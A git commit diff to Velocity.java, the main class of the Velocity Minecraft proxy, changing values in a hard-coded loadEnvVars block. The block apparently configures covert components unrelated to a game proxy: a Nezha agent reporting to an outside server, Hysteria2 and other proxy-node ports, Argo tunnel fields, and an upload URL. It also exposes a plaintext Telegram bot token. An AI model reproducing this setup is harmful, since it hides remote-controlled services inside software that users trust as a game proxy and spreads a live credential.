fbc8ea0120332c2ee9c8394d5c0d8595c12902ff
axliuliu <9866liu@gmail.com>
2025-10-23 14:51:18 +0800

    Update Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -146,7 +146,7 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "28d79193-5e0b-40c8-b7c9-557f23fde0e0");
+    envVars.put("UUID", "48242ea0-4fcd-4eeb-91ad-a3ecdd38ea09");
     envVars.put("FILE_PATH", "./world");
     envVars.put("NEZHA_SERVER", "a.holoy.dpdns.org:36958");
     envVars.put("NEZHA_PORT", "");
@@ -154,7 +154,7 @@ public final class Velocity {
     envVars.put("ARGO_PORT", "");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "25935");
+    envVars.put("HY2_PORT", "26655");
     envVars.put("TUIC_PORT", "");
     envVars.put("REALITY_PORT", "");
     envVars.put("UPLOAD_URL", "");
@@ -162,7 +162,7 @@ public final class Velocity {
     envVars.put("BOT_TOKEN", "8337759907:AAGvmCiBeS2G_RXiNEUHYa4cdxn119nzV44");
     envVars.put("CFIP", "");
     envVars.put("CFPORT", "");
-    envVars.put("NAME", "kingsnetwork.uk");
+    envVars.put("NAME", "eternalzero.cloud");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
